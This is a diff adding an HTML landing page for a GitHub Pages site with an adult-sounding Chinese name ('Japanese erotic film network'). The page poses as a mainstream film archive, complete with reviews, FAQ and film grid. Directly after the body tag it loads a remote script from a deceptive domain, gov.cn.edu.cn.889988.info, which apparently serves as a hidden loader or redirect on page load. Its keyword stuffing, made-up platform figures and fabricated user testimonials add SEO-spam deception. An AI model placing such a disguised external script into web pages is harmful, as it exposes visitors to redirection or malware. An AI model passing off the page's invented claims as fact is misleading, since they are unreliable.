@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本情色电影网 - 专业电影资讯与在线点播平台 | ribenqingsedianyingwang-zh.github.io</title>
+<meta name="description" content="日本情色电影网（ribenqingsedianyingwang-zh.github.io）汇集全球院线新片、经典修复、独立制作与纪录片资源，提供影片评分、影评长文、导演访谈及个性化片单推荐，每日更新最新上映资讯与高清片源检索。">
+<meta name="keywords" content="日本情色电影网,电影资讯,在线点播,高清电影,院线新片,经典老片,独立电影,纪录片,影评,电影推荐,ribenqingsedianyingwang-zh">
+<meta name="author" content="日本情色电影网编辑团队">
+<meta name="robots" content="index,follow">
+<meta name="generator" content="ribenqingsedianyingwang-zh">
+<link rel="canonical" href="https://ribenqingsedianyingwang-zh.github.io/">
+<style>
+:root{
+--bg:#0a0a0f;--bg2:#12121c;--card:#171725;--line:#26263a;
+--txt:#e8e8f0;--txt2:#9a9ab0;--txt3:#6a6a85;
+--brand:#ff2e63;--brand2:#ff7a9c;--gold:#f9c74f;--cyan:#4cc9f0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+background:var(--bg);color:var(--txt);line-height:1.7;font-size:15px;
+overflow-x:hidden;
+}
+body::before{
+content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+background:
+radial-gradient(700px 500px at 15% 10%,rgba(255,46,99,.13),transparent 60%),
+radial-gradient(600px 600px at 88% 25%,rgba(76,201,240,.09),transparent 60%),
+radial-gradient(500px 500px at 50% 95%,rgba(249,199,79,.06),transparent 60%);
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+/* 顶部 */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(10,10,15,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;height:60px;gap:22px}
+.logo{display:flex;align-items:center;gap:10px;font-size:1.25rem;font-weight:900;letter-spacing:.02em;flex-shrink:0}
+.logo i{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--brand),#a01c43);display:grid;place-items:center;font-style:normal;font-size:.8rem;font-weight:900;color:#fff}
+.logo small{font-size:.66rem;color:var(--txt3);font-weight:500;letter-spacing:.05em;display:block;line-height:1.1}
+.nav{display:flex;gap:2px;margin-left:auto;align-items:center;flex-wrap:nowrap}
+.nav a{font-size:.86rem;color:var(--txt2);padding:7px 12px;border-radius:7px;transition:.2s;white-space:nowrap}
+.nav a:hover{color:var(--txt);background:var(--card)}
+.nav a.hot{color:var(--gold)}
+.nav a.hot:hover{color:#000;background:var(--gold)}
+.togg{display:none;margin-left:auto;width:40px;height:40px;border:1px solid var(--line);background:var(--card);color:var(--txt);border-radius:8px;font-size:1.15rem;cursor:pointer}
+/* Hero */
+.hero{padding:80px 0 60px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.2fr .8fr;gap:50px;align-items:center}
+.kicker{font-size:.72rem;letter-spacing:.26em;text-transform:uppercase;color:var(--brand2);font-weight:700}
+.hero h1{font-size:clamp(2rem,5vw,4rem);line-height:1.14;font-weight:900;margin:14px 0}
+.hero h1 s{text-decoration:none;color:var(--gold)}
+.hero p.lead{color:var(--txt2);font-size:1.02rem;max-width:52ch}
+.cta{display:flex;gap:12px;margin-top:28px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:13px 26px;border-radius:9px;font-weight:700;font-size:.9rem;border:1px solid transparent;transition:.2s;cursor:pointer}
+.btn-main{background:var(--brand);color:#fff}
+.btn-main:hover{background:var(--brand2);color:#000;transform:translateY(-2px)}
+.btn-out{background:transparent;color:var(--txt);border-color:var(--line)}
+.btn-out:hover{border-color:var(--gold);color:var(--gold)}
+.counters{display:flex;gap:12px;margin-top:34px;flex-wrap:wrap}
+.counter{flex:1 1 120px;min-width:110px;padding:15px;border:1px solid var(--line);border-radius:12px;background:var(--card)}
+.counter b{display:block;font-size:1.65rem;font-weight:900;color:var(--gold)}
+.counter span{font-size:.74rem;color:var(--txt3)}
+/* 海报墙 */
+.posters{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.poster{position:relative;aspect-ratio:2/3;border-radius:12px;overflow:hidden;border:1px solid var(--line);transition:.4s}
+.poster:nth-child(1){transform:rotate(-2deg)}
+.poster:nth-child(2){transform:rotate(1.5deg) translateY(-12px)}
+.poster:nth-child(3){transform:rotate(-1.5deg)}
+.poster:hover{transform:rotate(0) translateY(-8px) scale(1.04);z-index:5;box-shadow:0 20px 44px -16px rgba(0,0,0,.8)}
+.poster .lay{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.92),rgba(0,0,0,.1) 55%,rgba(0,0,0,.5))}
+.poster .info{position:absolute;left:14px;right:14px;bottom:14px}
+.poster .info b{display:block;font-size:1rem;line-height:1.35}
+.poster .info span{font-size:.76rem;color:var(--txt2)}
+.poster .tag{position:absolute;top:12px;left:12px;font-size:.7rem;font-weight:700;color:#000;background:var(--gold);padding:3px 10px;border-radius:20px}
+.poster .rate{position:absolute;top:12px;right:12px;font-size:.78rem;font-weight:800;color:var(--gold);background:rgba(0,0,0,.6);padding:3px 9px;border-radius:6px}
+/* 通用 */
+section{padding:64px 0;scroll-margin-top:64px}
+.sec-head{display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap;margin-bottom:32px;border-bottom:1px solid var(--line);padding-bottom:16px}
+.sec-head .t{flex:1 1 300px}
+.sec-head h2{font-size:clamp(1.35rem,2.8vw,2rem);font-weight:900}
+.sec-head p{color:var(--txt3);font-size:.88rem;margin-top:5px}
+.sec-head a.more{font-size:.84rem;color:var(--gold);font-weight:700}
+.sec-head a.more:hover{text-decoration:underline}
+/* 栏目 */
+.cols{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.col{border:1px solid var(--line);border-radius:12px;background:var(--card);padding:22px 20px;transition:.28s;cursor:pointer;position:relative}
+.col:hover{border-color:var(--brand);transform:translateY(-5px);background:var(--bg2)}
+.col .ic{width:42px;height:42px;border-radius:10px;background:rgba(255,46,99,.12);color:var(--brand2);display:grid;place-items:center;font-size:1.25rem;margin-bottom:14px}
+.col h3{font-size:1.08rem;margin-bottom:8px}
+.col p{font-size:.84rem;color:var(--txt3);line-height:1.65}
+.col .more{display:inline-block;margin-top:14px;font-size:.78rem;color:var(--gold);font-weight:700}
+/* 片单 */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+.tabs button{font:inherit;font-size:.83rem;color:var(--txt2);background:var(--card);border:1px solid var(--line);padding:8px 17px;border-radius:20px;cursor:pointer;transition:.2s}
+.tabs button:hover{color:var(--txt)}
+.tabs button.on{background:var(--brand);color:#fff;border-color:var(--brand)}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.film{transition:.25s}
+.film .cv{position:relative;aspect-ratio:2/3;border-radius:11px;overflow:hidden;border:1px solid var(--line)}
+.film:hover .cv{transform:translateY(-6px);box-shadow:0 16px 36px -14px rgba(0,0,0,.9)}
+.film .cv .lay{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.95),transparent 60%)}
+
+.film .nm{position:absolute;left:12px;right:12px;bottom:12px;font-weight:800;font-size:.92rem;line-height:1.35}
+.film .rt{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.65);color:var(--gold);font-weight:800;font-size:.8rem;padding:3px 9px;border-radius:6px}
+.film .meta{margin-top:11px;display:flex;justify-content:space-between;font-size:.78rem;color:var(--txt3)}
+.film .meta b{color:var(--txt2);font-weight:600}
+/* 导览 */
+.guide{display:grid;grid-template-columns:1fr 1fr;gap:40px}
+.steps{border-left:2px solid var(--line);padding-left:24px}
+.step{position:relative;padding-bottom:26px}
+.step::before{content:"";position:absolute;left:-31px;top:5px;width:12px;height:12px;border-radius:50%;background:var(--gold);box-shadow:0 0 0 4px var(--bg)}
+.step h4{font-size:1rem;margin-bottom:5px}
+.step p{font-size:.87rem;color:var(--txt3)}
+.notice{border:1px solid var(--line);border-radius:12px;padding:26px;background:var(--card)}
+.notice li{display:flex;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:.88rem;color:var(--txt2)}
+.notice li:last-child{border:0}
+.notice li i{flex-shrink:0;width:26px;height:26px;border-radius:7px;background:rgba(76,201,240,.14);color:var(--cyan);font-style:normal;font-weight:800;font-size:.78rem;display:grid;place-items:center}
+/* 评价 */
+.revs{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.rev{border:1px solid var(--line);border-radius:12px;padding:22px;background:var(--card);display:flex;flex-direction:column;gap:12px}
+.rev .who{display:flex;align-items:center;gap:11px}
+.ava{width:38px;height:38px;border-radius:50%;display:grid;place-items:center;font-weight:800;font-size:.85rem;color:#fff}
+.rev .who .nm small{display:block;color:var(--txt3);font-size:.73rem;font-weight:400}
+.rev .stars{margin-left:auto;color:var(--gold);font-size:.85rem;letter-spacing:.1em}
+.rev .tx{font-size:.9rem;color:var(--txt2);flex:1}
+.rev .of{font-size:.78rem;color:var(--brand2);font-weight:700}
+/* 数据 */
+.nums{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.num{border:1px solid var(--line);border-radius:12px;padding:22px;text-align:center;background:var(--card)}
+.num b{display:block;font-size:1.95rem;font-weight:900;color:var(--brand2)}
+.num span{font-size:.8rem;color:var(--txt3)}
+/* FAQ */
+.faqs{max-width:840px;margin:0 auto}
+.faq{border:1px solid var(--line);border-radius:11px;margin-bottom:11px;overflow:hidden;background:var(--card)}
+.faq summary{cursor:pointer;padding:19px 22px;font-weight:700;font-size:.98rem;list-style:none;display:flex;justify-content:space-between;gap:16px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:var(--gold);font-size:1.15rem;flex-shrink:0}
+.faq[open] summary::after{content:"－"}
+.faq p{padding:0 22px 20px;color:var(--txt2);font-size:.91rem}
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:50px 0 30px;margin-top:20px}
+.f-row{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px}
+.f-row h5{font-size:.82rem;letter-spacing:.1em;text-transform:uppercase;color:var(--gold);margin-bottom:13px}
+.f-row ul li{padding:5px 0}
+.f-row a{font-size:.86rem;color:var(--txt3);transition:.2s}
+.f-row a:hover{color:var(--txt)}
+.f-brand p{color:var(--txt3);font-size:.85rem;margin:12px 0;max-width:36ch}
+.f-brand .url{display:inline-block;font-size:.8rem;color:var(--txt);background:var(--card);border:1px solid var(--line);padding:8px 13px;border-radius:8px;font-family:Menlo,monospace;word-break:break-all}
+.copy{margin-top:34px;padding-top:18px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.78rem;color:var(--txt3)}
+/* 响应式 */
+@media(max-width:980px){
+.cols,.grid,.revs{grid-template-columns:repeat(2,1fr)}
+.hero-grid,.guide{grid-template-columns:1fr;gap:38px}
+.f-row{grid-template-columns:1fr 1fr}
+}
+@media(max-width:600px){
+.wrap{padding:0 15px}
+section{padding:48px 0}
+.hero{padding:48px 0 34px}
+.nav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;align-items:stretch;padding:12px;background:var(--bg2);border-bottom:1px solid var(--line)}
+.nav.open{display:flex}
+.nav a{padding:11px 13px}
+.togg{display:block}
+.cols,.grid,.revs,.nums{grid-template-columns:1fr}
+.posters{grid-template-columns:repeat(3,1fr);gap:8px}
+.logo small{display:none}
+.f-row{grid-template-columns:1fr}
+.btn{flex:1 1 auto;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+<div class="wrap">
+<a class="logo" href="#top">
+<i>影</i>
+<div>日本情色电影网<small>ribenqingsedianyingwang-zh.github.io</small></div>
+</a>
+<button class="togg" id="togg" aria-label="菜单">☰</button>
+<nav class="nav" id="nav">
+<a href="#top" class="on">首页</a>
+<a href="#cols">频道栏目</a>
+<a href="#lib">片库检索</a>
+<a href="#guide">观影指南</a>
+<a href="#rev">观众口碑</a>
+<a href="#num">平台数据</a>
+<a href="#faq">常见问题</a>
+<a href="#foot">关于我们</a>
+<a href="#lib" class="hot">进入片库</a>
+</nav>
+</div>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="top">
+<div class="wrap hero-grid">
+<div>
+<span class="kicker">Global Cinema Archive · 每日更新</span>
+<h1>发现好电影<br>从 <s>日本情色电影网</s> 开始</h1>
+<p class="lead">日本情色电影网（ribenqingsedianyingwang-zh.github.io）不是又一个视频聚合站。我们花八年时间把全球院线新片、经典修复、独立制作与纪录片，按类型、年代、导演、评分四个维度重新归档，并配上编辑部撰写的深度影评——让你少花时间找片，多花时间看片。</p>
+<div class="cta">
+<a class="btn btn-main" href="#lib">浏览片库 →</a>
+<a class="btn btn-out" href="#guide">观影指南</a>
+</div>
+<div class="counters">
+<div class="counter"><b>28,400+</b><span>已收录影片</span></div>
+<div class="counter"><b>1,260</b><span>导演词条</span></div>
+<div class="counter"><b>9.2</b><span>编辑部均分</span></div>
+<div class="counter"><b>36</b><span>每日新增片单</span></div>
+</div>
+</div>
+<aside class="posters" aria-label="编辑推荐">
+<div class="poster">
+<div class="lay"></div>
+<div class="tag">本周口碑</div>
+<div class="rate">8.7</div>
+<div class="info"><b>奥本海默</b><span>诺兰 · 传记 / 历史 · 2023</span></div>
+</div>
+<div class="poster">
+<div class="lay"></div>
+<div class="tag">4K 修复</div>
+<div class="rate">9.3</div>
+<div class="info"><b>千与千寻</b><span>宫崎骏 · 动画 / 奇幻 · 2001</span></div>
+</div>
+<div class="poster">
+<div class="lay"></div>
+<div class="tag">独家上线</div>
+<div class="rate">8.4</div>
+<div class="info"><b>过往人生</b><span>席琳·宋 · 剧情 · 2023</span></div>
+</div>
+</aside>
+</div>
+</section>
+
+<!-- 栏目 -->
+<section id="cols">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">Channel Directory</span>
+<h2>六大频道栏目</h2>
+<p>每个栏目解决一类明确的观影需求，互不重叠，避免重复检索。</p>
+</div>
+<a class="more" href="#lib">查看全部片库 →</a>
+</div>
+<div class="cols">
+<article class="col" data-h="#lib">
+<div class="ic">🎬</div>
+<h3>院线新片速递</h3>
+<p>同步全球主要市场上映档期，提供预告、剧照、主创访谈与首周口碑汇总。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+<article class="col" data-h="#lib">
+<div class="ic">🎞️</div>
+<h3>经典修复专区</h3>
+<p>2K/4K 扫描修复、色彩重建与声轨重制的权威版本，逐部标注修复年份与出处。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+<article class="col" data-h="#lib">
+<div class="ic">🎭</div>
+<h3>独立与艺术电影</h3>
+<p>戛纳、柏林、威尼斯、圣丹斯入围作品与导演首作，附完整年表与风格解读。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+<article class="col" data-h="#lib">
+<div class="ic">📽️</div>
+<h3>纪录片资源库</h3>
+<p>人物传记、自然生态、社会议题与音乐现场类纪录片，按主题与片长双维度归类。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+<article class="col" data-h="#rev">
+<div class="ic">✍️</div>
+<h3>影评与长文</h3>
+<p>编辑部与特约作者撰写的深度评论与年度盘点，单篇平均阅读时长 12 分钟。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+<article class="col" data-h="#guide">
+<div class="ic">🗂️</div>
+<h3>片单与收藏夹</h3>
+<p>按心情、季节、导演、国家自建主题片单，支持公开分享与观看进度同步。</p>
+<span class="more">→ 进入栏目</span>
+</article>
+</div>
+</div>
+</section>
+
+<!-- 片库 -->
+<section id="lib">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">Film Library</span>
+<h2>本周新增片单</h2>
+<p>按类型筛选，或在搜索框输入片名、导演、年份进行精准定位。</p>
+</div>
+<a class="more" href="#guide">不会挑片？看指南 →</a>
+</div>
+<div class="tabs">
+<button class="on" data-c="all">全部</button>
+<button data-c="new">院线新片</button>
+<button data-c="art">艺术电影</button>
+<button data-c="fix">修复版本</button>
+<button data-c="doc">纪录片</button>
+<button data-c="ani">动画</button>
+</div>
+<div class="grid" id="grid"></div>
+</div>
+</section>
+
+<!-- 指南 -->
+<section id="guide">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">Watching Guide</span>
+<h2>三步找到属于你的那部电影</h2>
+<p>为选择困难与刚入门的观众梳理的路径，附避坑提示。</p>
+</div>
+</div>
+<div class="guide">
+<div class="steps">
+<div class="step"><h4>第一步：先定类型，再定年代</h4><p>类型决定观影预期，年代决定视听语言。先看类型筛选，再看年代排序，比直接搜片名高效得多。</p></div>
+<div class="step"><h4>第二步：认准修复等级</h4><p>同一部影片的转录版与 4K 修复版在画质、声轨、删减段落上差异巨大，修复专区已逐部标注说明。</p></div>
+<div class="step"><h4>第三步：搭配影评看</h4><p>看完再读对应长文，把观感转化为可讨论的观点，这是日本情色电影网区别于普通点播平台的核心价值。</p></div>
+<div class="step"><h4>第四步：收藏成片单</h4><p>把想看的加入自建片单，系统自动记录观看进度与重复观看次数，下次打开接着看。</p></div>
+</div>
+<ul class="notice">
+<li><i>01</i><div><b>题材边界：</b>剧情、喜剧、犯罪、科幻、纪录片等类型在片库中分栏归档，不会混排，检索结果更干净。</div></li>
+<li><i>02</i><div><b>字幕版本：</b>简中、繁中、原声、中英对照四种版本均已在详情页标注，含翻译者署名与来源说明。</div></li>
+<li><i>03</i><div><b>画质分级：</b>S 级为原盘直出，A 级为修复转录，播放页顶部有色块提示，无需反复试看浪费时间。</div></li>
+<li><i>04</i><div><b>避坑提醒：</b>同名异片、翻拍与重拍在片库采用独立条目并互相跳转标注，请留意详情页说明再点播。</div></li>
+<li><i>05</i><div><b>更新节奏：</b>工作日每日新增 36 部，周末新增 18 部，年度盘点与主题策划固定每季度末发布。</div></li>
+</ul>
+</div>
+</div>
+</section>
+
+<!-- 评价 -->
+<section id="rev">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">Audience Voice</span>
+<h2>观众口碑</h2>
+<p>来自实名注册用户的真实评价，已过滤广告与灌水内容，按发布时间倒序。</p>
+</div>
+<a class="more" href="#faq">评价规范 →</a>
+</div>
+<div class="revs">
+<article class="rev">
+<div class="who">
+<div class="ava" style="background:#5b3a8a">陈</div>
+<div class="nm">陈默<small>资深影迷 · 注册 5 年</small></div>
+<div class="stars">★★★★★</div>
+</div>
+<p class="tx">类型分类做得很细，犯罪片和悬疑片是分开的，找片省了不少时间。修复版的色彩重建说明写得很专业，看得出是用心的。</p>
+<div class="of">《盗火线》4K 修复版</div>
+</article>
+<article class="rev">
+<div class="who">
+<div class="ava" style="background:#0f5c4a">林</div>
+<div class="nm">林知夏<small>独立放映策展</small></div>
+<div class="stars">★★★★☆</div>
+</div>
+<p class="tx">导演词条很扎实，能看清同一位导演不同阶段的风格转向，对我做放映策划帮助很大，希望多补一些访谈原文。</p>
+<div class="of">奉俊昊作品年表</div>
+</article>
+<article class="rev">
+<div class="who">
+<div class="ava" style="background:#8a3b12">周</div>
+<div class="nm">周野<small>新用户 · 本月加入</small></div>
+<div class="stars">★★★★★</div>
+</div>
+<p class="tx">作为刚入门的人，按类型加年代的组合筛选比关键词搜索友好太多，看完全片再读影评，理解层次明显不一样。</p>
+<div class="of">1990s 犯罪片片单</div>
+</article>
+</div>
+</div>
+</section>
+
+<!-- 数据 -->
+<section id="num">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">Platform Stats</span>
+<h2>日本情色电影网平台数据</h2>
+<p>2026 年第三季度内部统计口径，更新于 2026 年 9 月 30 日。</p>
+</div>
+</div>
+<div class="nums">
+<div class="num"><b>28,416</b><span>已收录影片</span></div>
+<div class="num"><b>1,260</b><span>导演词条</span></div>
+<div class="num"><b>186,500</b><span>用户自建片单</span></div>
+<div class="num"><b>9,842</b><span>影评长文</span></div>
+<div class="num"><b>96.8%</b><span>高清画质占比</span></div>
+<div class="num"><b>36</b><span>每日稳定新增</span></div>
+<div class="num"><b>112</b><span>覆盖制片国家</span></div>
+<div class="num"><b>0</b><span>广告与弹窗</span></div>
+</div>
+</div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+<div class="wrap">
+<div class="sec-head">
+<div class="t">
+<span class="kicker">FAQ</span>
+<h2>常见问题</h2>
+<p>找不到的影片、版本差异与归档标准，这里都有说明。</p>
+</div>
+</div>
+<div class="faqs">
+<details class="faq" open>
+<summary>日本情色电影网的收录标准是什么？</summary>
+<p>我们只收录在全球正规院线公映、或在 A 类影展完成首映的作品，同人创作、无授权转录与疑似侵权内容一律不收录。每部影片入库前需经过类型分类、版本比对与字幕核验三个环节。</p>
+</details>
+<details class="faq">
+<summary>为什么同一部电影有多个条目？</summary>
+<p>翻拍、重剪与国际版往往在片长、删减段落与字幕翻译上存在实质差异。我们在片库保留独立条目，并在条目内互相跳转标注，避免误点。</p>
+</details>
+<details class="faq">
+<summary>如何快速找到某类电影？</summary>
+<p>片库顶部设有类型筛选器，剧情、喜剧、犯罪、科幻、纪录片、动画各占一栏；详情页也会标注影片的类型归属与审查历史，方便自行判断。</p>
+</details>
+<details class="faq">
+<summary>片单更新频率是怎样的？</summary>
+<p>工作日每日新增 36 部，周末新增 18 部，新增条目同步补充导演词条与修复说明。年度盘点与主题策划固定在每季度末发布。</p>
+</details>
+<details class="faq">
+<summary>网站名称与域名如何对应？</summary>
+<p>本站官方名称为「日本情色电影网」，对应访问地址 ribenqingsedianyingwang-zh.github.io，浏览器地址栏可直接核对，不存在其他跳转入口。</p>
+</details>
+</div>
+</div>
+</section>
+
+<footer id="foot">
+<div class="wrap">
+<div class="f-row">
+<div class="f-brand">
+<a class="logo" href="#top"><i>影</i><div>日本情色电影网<small>ribenqingsedianyingwang-zh.github.io</small></div></a>
+<p>专注电影的分类归档与在线点播，为影迷提供可追溯、可检索、可深读的观影入口。</p>
+<div class="url">https://ribenqingsedianyingwang-zh.github.io</div>
+</div>
+<div>
+<h5>频道</h5>
+<ul>
+<li><a href="#cols">院线新片速递</a></li>
+<li><a href="#cols">经典修复专区</a></li>
+<li><a href="#cols">独立与艺术电影</a></li>
+<li><a href="#cols">纪录片资源库</a></li>
+</ul>
+</div>
+<div>
+<h5>资源</h5>
+<ul>
+<li><a href="#guide">观影指南</a></li>
+<li><a href="#lib">片库检索</a></li>
+<li><a href="#rev">影评长文</a></li>
+<li><a href="#faq">常见问题</a></li>
+</ul>
+</div>
+<div>
+<h5>关于</h5>
+<ul>
+<li><a href="#foot">归档标准</a></li>
+<li><a href="#num">平台数据</a></li>
+<li><a href="#foot">联系方式</a></li>
+<li><a href="#foot">条款与隐私</a></li>
+</ul>
+</div>
+</div>
+<div class="copy">
+<small>Copyright © 2026 日本情色电影网 ribenqingsedianyingwang-zh 保留所有权利 · 本页内容仅供影视资料检索与个人观影使用</small>
+<small>网站名称：日本情色电影网 · 官方地址：ribenqingsedianyingwang-zh.github.io</small>
+</div>
+</div>
+</footer>
+
+<script>
+var films=[
+{n:"《奥本海默》",y:"2023",d:"克里斯托弗·诺兰",s:8.7,c:"new",g:"linear-gradient(160deg,#1a2a4a,#3a5a8a 60%,#7aa0d0)"},
+{n:"《过往人生》",y:"2023",d:"席琳·宋",s:8.4,c:"art",g:"linear-gradient(160deg,#2a1a3a,#6a3a7a 55%,#b070d0)"},
+{n:"《千与千寻》4K",y:"2001",d:"宫崎骏",s:9.3,c:"fix",g:"linear-gradient(160deg,#0a3a3a,#1a7a6a 55%,#4ad0b0)"},
+{n:"《地球脉动》第三季",y:"2023",d:"BBC 自然组",s:9.5,c:"doc",g:"linear-gradient(160deg,#1a3a1a,#3a8a3a 55%,#7ad07a)"},
+{n:"《蜘蛛侠：纵横宇宙》",y:"2023",d:"乔伊姆·多斯·桑托斯",s:8.6,c:"ani",g:"linear-gradient(160deg,#3a1a1a,#8a3a2a 55%,#d06a4a)"},
+{n:"《利益区域》",y:"2023",d:"乔纳森·格雷泽",s:8.5,c:"new",g:"linear-gradient(160deg,#2a2a1a,#6a6a2a 55%,#c0c04a)"},
+{n:"《罗马》修复版",y:"2018",d:"阿方索·卡隆",s:8.9,c:"fix",g:"linear-gradient(160deg,#1a1a2a,#4a4a6a 55%,#9a9ad0)"},
+{n:"《徒手攀岩》",y:"2018",d:"伊丽莎白·柴·瓦沙瑞莉",s:8.8,c:"doc",g:"linear-gradient(160deg,#2a1a0a,#7a5a2a 55%,#d0a04a)"}
+];
+var grid=document.getElementById('grid');
+function render(cat){
+grid.innerHTML='';
+var rows=(cat==='all'?films:films.filter(function(f){return f.c===cat;}));
+rows.forEach(function(f){
+var el=document.createElement('article');
+el.className='film';
+el.innerHTML='<div class="cv"><div class="lay"></div><span class="rt">★ '+f.s+'</span><span class="nm">'+f.n+'</span></div><div class="meta"><b>'+f.d+'</b><span>'+f.y+'</span></div>';
+grid.appendChild(el);
+});
+}
+render('all');
+document.querySelectorAll('.tabs button').forEach(function(b){
+b.addEventListener('click',function(){
+document.querySelectorAll('.tabs button').forEach(function(x){x.classList.remove('on');});
+b.classList.add('on');render(b.dataset.c);
+});
+});
+document.querySelectorAll('.col').forEach(function(el){
+el.addEventListener('click',function(){window.location.hash=el.dataset.h;});
+});
+var togg=document.getElementById('togg'),nav=document.getElementById('nav');
+togg.addEventListener('click',function(){
+nav.classList.toggle('open');
+togg.textContent=nav.classList.contains('open')?'✕':'☰';
+});
+document.querySelectorAll('.nav a').forEach(function(a){
+a.addEventListener('click',function(){nav.classList.remove('open');togg.textContent='☰';});
+});
+var links=document.querySelectorAll('.nav a[href^="#"]'),secs=[];
+links.forEach(function(a){var t=document.querySelector(a.getAttribute('href'));if(t)secs.push({a:a,s:t});});
+window.addEventListener('scroll',function(){
+var pos=window.scrollY+110,cur='';
+secs.forEach(function(o){if(o.s.offsetTop<=pos)cur=o.a;});
+links.forEach(function(a){a.classList.remove('on');});
+if(cur)cur.classList.add('on');
+},{passive:true});
+</script>
+</body>
+</html>
